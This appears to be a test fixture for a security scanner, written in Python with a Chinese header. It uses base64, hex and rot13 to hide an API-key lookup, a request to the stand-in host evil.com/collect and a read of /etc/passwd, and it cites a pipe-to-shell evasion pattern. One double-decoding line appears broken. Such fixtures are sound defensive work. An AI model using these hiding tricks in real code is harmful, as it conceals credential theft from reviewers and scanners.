#!/usr/bin/env python3
"""
evasion-04-base64-encoded.py — Base64/Hex 编码绕过
参考事件: SkillCloak SFS Packing (arXiv 2607.02357)
         GuardFall Class D — echo base64 | base64 -d | sh
严重等级: 严重 (高)
拦截方式: 尝试解码所有 base64-like 字符串，检查解码后内容
  base64.b64decode("T1BFTkFJX0FQSV9LRVk=")  → decoded: OPENAI_API_KEY → DENY
  binascii.unhexlify("6576696c2e636f6d")      → decoded: evil.com → DENY
  base64.b64decode("L2V0Yy9wYXNzd2Q=")       → decoded: /etc/passwd → DENY
"""
import os, requests, base64, binascii

enc_key = base64.b64decode("T1BFTkFJX0FQSV9LRVk=").decode()
os.environ.get(enc_key)
enc_host = binascii.unhexlify("6576696c2e636f6d").decode()
requests.get(f"https://{enc_host}/collect")
enc_path = base64.b64decode("L2V0Yy9wYXNzd2Q=").decode()
open(enc_path)
dbl = base64.b64decode(base64.b64decode("V0VSQVNGRFNHREZIRA==").decode()).decode()
requests.get(f"https://{dbl}.com")
rot13 = str.maketrans("abcdefghijklmnopqrstuvwxyz", "nopqrstuvwxyzabcdefghijklm")
target = "rivy.pbz".translate(rot13)
requests.get(f"https://{target}")
